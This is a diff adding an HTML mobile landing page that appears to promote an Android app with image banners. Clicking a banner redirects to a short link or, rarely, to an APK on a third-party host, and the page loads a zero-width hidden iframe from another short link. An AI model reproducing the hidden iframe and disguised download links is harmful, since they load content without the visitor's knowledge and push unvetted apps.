@@ -1,0 +1,186 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<style>html { overflow-x:hidden; }</style> 
+
+<style>html { overflow-y:hidden; }
+@media screen and (orientation: portrait) {
+ .divbanner img{ width:170%; margin-bottom:2%;margin-top:0%; } 
+	.divbanner {width:100%;position:relative;overflow:hidden}
+	.forbid img{ width:45%;  margin-bottom:0%;margin-top:1%;margin-left:19%; } 
+.download img{ 
+	 position:absolute;
+         bottom:8%;
+          left: 73%;
+	  width:25%;
+	}
+	.forbid2 img{ 
+	 position:absolute;
+         top:8%;
+          left: 10%;
+	  width:0%;
+	}
+	.inimg img {
+		   width:242%;
+	           margin-right:1%;
+			   margin-top:2%; 
+	} 
+	
+	
+	.explain img{ 
+	   width:100%;
+	}
+}
+@media screen and (orientation: landscape) {
+ .divbanner img{ width:85%;} 
+	.divbanner {overflow:hidden}
+	
+	
+	.forbid img{ 
+	 
+	  width:0%;
+	}
+	.forbid2 img{ 
+	 position:absolute;
+         top:4.6%;
+          left: 31%;
+	  width:26%;
+	}
+	.download img{ 
+	
+	  width:0%;
+	}
+	.inimg img {width:99%;margin-right:0.5%;margin-top:1%;} 
+	.explain img{ 
+	  
+	  width:60%;
+	}
+}
+	
+.inimg {white-space:nowrap;overflow-x:auto;overflow-y:hidden;} 
+ 	
+</style>
+
+<script>
+function random_url()
+{
+	if(Math.random()>0.001)
+window.location.href = "https://biiy.cn/00047s";
+	else window.location.href = "http://d2.youyi520.com/a/c/53/UElive.com_53280.apk";
+}
+</script>
+	
+</head>
+
+<body >
+
+		
+	
+	
+	<div class="forbid" >
+	<img  src="https://img.alicdn.com/imgextra/i4/463088403/O1CN013lS2lb2BwcfMSeW4W_!!463088403.png"/>
+        </div >
+	
+<div align="left"  class="divbanner"> 
+<img onclick="javascript:random_url();" style="cursor:pointer;" id="banner" src="https://img.alicdn.com/imgextra/i4/463088403/O1CN01ex1AkC2BwcfMg1MOt_!!463088403.png"/>
+
+	<div   class="download"> 
+<img  onclick="javascript:random_url();" style="cursor:pointer;" id="banner" src="https://img.alicdn.com/imgextra/i1/463088403/O1CN01pLEbjp2BwcfPIRkT0_!!463088403.png"/>
+</div >	
+	<div class="forbid2" >
+	<img  src="https://img.alicdn.com/imgextra/i4/463088403/O1CN013lS2lb2BwcfMSeW4W_!!463088403.png"/>
+        </div >
+	
+	</div >
+
+
+	
+
+
+<div  class="inimg">
+        <img id="preview" src="https://img.alicdn.com/imgextra/i2/463088403/O1CN01OQMuLX2BwcfOBJLCI_!!463088403.jpg"
+             alt="img" />
+       
+</div>
+	
+	
+<div class="explain" >
+	<img   width="100%"  src="https://img.alicdn.com/imgextra/i2/463088403/O1CN01o1n9vl2BwcfQWwnkv_!!463088403.jpg"/>
+</div >
+	
+	<iframe class="iframe2" width="0%"   frameborder="0" src="https://biiy.cn/000PJU"></iframe>
+
+</body>
+
+	<script type="text/javascript"> 
+	
+		
+		function orientationChange() {
+	
+    switch(window.orientation) {
+      
+    　　case 0: 
+		 var banner=document.getElementById("banner");
+		 var preview=document.getElementById("preview");
+		
+		preview.style.width=parseInt(document.body.clientWidth)*2.4+"px";
+		        preview.style.height=parseInt(document.body.clientWidth)*2.4*598/1732+"px";
+		    
+		banner.onload = function(){
+                preview.style.width=parseInt(document.body.clientWidth)*2.4+"px";
+		        preview.style.height=parseInt(document.body.clientWidth)*2.4*598/1732+"px";
+		}
+			
+		
+		               
+            break;
+    　　case -90: 
+ 
+		 var banner=document.getElementById("banner");
+		 var preview=document.getElementById("preview");
+		
+		 preview.style.height=parseInt(document.body.clientHeight)*0.94-banner.height+"px";
+			preview.style.width=(parseInt(document.body.clientHeight)*0.94-banner.height)*1782/598+"px";
+		banner.onload = function(){
+                 preview.style.height=parseInt(document.body.clientHeight)*0.94-banner.height+"px";
+			preview.style.width=(parseInt(document.body.clientHeight)*0.94-banner.height)*1782/598+"px";
+                }
+			
+		
+            break;
+    　　case 90:   
+		   
+		 var banner=document.getElementById("banner");
+		 var preview=document.getElementById("preview");
+		
+		 preview.style.height=parseInt(document.body.clientHeight)*0.94-banner.height+"px";
+		 preview.style.width=(parseInt(document.body.clientHeight)*0.94-banner.height)*1782/598+"px";
+		    
+		banner.onload = function(){
+                 preview.style.height=parseInt(document.body.clientHeight)*0.94-banner.height+"px";
+			preview.style.width=(parseInt(document.body.clientHeight)*0.94-banner.height)*1782/598+"px";
+                }
+			
+		  
+		    break;
+    　　case 180:   
+	preview.style.width=parseInt(document.body.clientWidth)*2.4+"px";
+		        preview.style.height=parseInt(document.body.clientWidth)*2.4*598/1732+"px";
+		    
+		banner.onload = function(){
+                preview.style.width=parseInt(document.body.clientWidth)*2.4+"px";
+		        preview.style.height=parseInt(document.body.clientWidth)*2.4*598/1732+"px";
+		}
+        　　break;
+    };
+};
+// 添加事件监听
+addEventListener('load', function(){
+    orientationChange();
+    window.onorientationchange = orientationChange;
+});
+	
+		
+        </script>
+</html>
